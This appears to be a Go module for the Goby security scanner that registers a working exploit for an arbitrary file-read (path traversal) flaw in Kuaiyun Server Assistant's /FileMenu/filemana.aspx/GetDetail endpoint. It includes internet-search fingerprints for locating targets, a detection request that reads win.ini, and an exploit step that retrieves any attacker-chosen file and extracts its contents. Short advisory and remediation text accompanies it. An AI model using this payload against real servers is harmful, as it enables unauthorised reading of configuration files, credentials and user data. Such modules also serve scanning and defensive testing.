package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Kuaiyun Server Assistant /FileMenu/filemana.aspx/GetDetail File Read Vulnerability",
    "Description": "<p>Kuaiyun Management Assistant is a program that assists in managing systems, websites, and databases. Its /FileMenu/filemana.aspx/GetDetail endpoint has a file read vulnerability. Attackers can exploit this vulnerability to access arbitrary files on the server, potentially leading to sensitive information disclosure, such as system configuration files and user data.</p>",
    "Product": "Kuaiyun Server Assistant",
    "Homepage": "https://www.zzidc.com/kyhelper",
    "DisclosureDate": "2024-12-31",
    "PostTime": "2025-01-02",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"base.css\" && body=\"CodeCk.aspx\"",
    "GobyQuery": "body=\"base.css\" && body=\"CodeCk.aspx\"",
    "Level": "1",
    "Impact": "<p>Attackers can exploit this vulnerability to read important files in the system (e.g., database configuration files, system configuration files, user data), leading to sensitive information disclosure and potentially escalating privileges or launching other attacks.</p>",
    "Recommendation": "<p>1. Follow the official website for updates: <a href=\"https://www.zzidc.com/kyhelper.\">https://www.zzidc.com/kyhelper.</a></p><p>2. Use firewalls or other security devices to set access policies and configure whitelist access.</p><p>3. Prohibit public network access to the system unless necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "Windows/win.ini,WINDOWS/System32/drivers/etc/hosts",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "Windows/win.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/FileMenu/filemana.aspx/GetDetail",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Content-Type": "application/json; charset=utf-8",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "{\"fpath\":\"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows/win.ini\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[fonts]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/FileMenu/filemana.aspx/GetDetail",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                    "Connection": "close",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Content-Type": "application/json; charset=utf-8",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "{\"fpath\":\"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\{{{filePath}}}\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "文件信息读取失败",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"d\":\"([^'\"]+)\""
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "快云服务器助手 /FileMenu/filemana.aspx/GetDetail 文件读取漏洞",
            "Product": "快云服务器助手",
            "Description": "<p>快云管理助手是一款辅助管理系统、网站和数据库的程序，其/FileMenu/filemana.aspx/GetDetail存在文件读取漏洞。攻击者可以通过构造特定的请求访问服务器上的任意文件，可能导致敏感信息泄露，例如系统配置文件、用户数据等。</p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"https://www.zzidc.com/kyhelper\">https://www.zzidc.com/kyhelper</a>。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、用户数据等，导致敏感信息泄露，进一步可能引发权限提升或其他攻击。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Kuaiyun Server Assistant /FileMenu/filemana.aspx/GetDetail File Read Vulnerability",
            "Product": "Kuaiyun Server Assistant",
            "Description": "<p>Kuaiyun Management Assistant is a program that assists in managing systems, websites, and databases. Its /FileMenu/filemana.aspx/GetDetail endpoint has a file read vulnerability. Attackers can exploit this vulnerability to access arbitrary files on the server, potentially leading to sensitive information disclosure, such as system configuration files and user data.</p>",
            "Recommendation": "<p>1. Follow the official website for updates: <a href=\"https://www.zzidc.com/kyhelper.\">https://www.zzidc.com/kyhelper.</a></p><p>2. Use firewalls or other security devices to set access policies and configure whitelist access.</p><p>3. Prohibit public network access to the system unless necessary.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to read important files in the system (e.g., database configuration files, system configuration files, user data), leading to sensitive information disclosure and potentially escalating privileges or launching other attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "filePath"
    ],
    "EditType": "fast",
    "PocId": "9981"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
